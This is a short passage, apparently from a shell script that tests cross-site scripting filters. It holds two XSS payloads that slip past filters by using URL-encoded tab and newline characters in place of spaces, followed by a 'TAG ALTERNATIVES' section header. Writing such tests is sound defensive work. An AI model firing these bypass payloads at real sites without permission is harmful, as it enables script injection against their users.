test_xss_payload "<img%09src=x%09onerror=alert('XSS')>" "Tab as space"
test_xss_payload "<img%0asrc=x%0aonerror=alert('XSS')>" "Newline as space"

echo -e "\n=== TAG ALTERNATIVES ==="
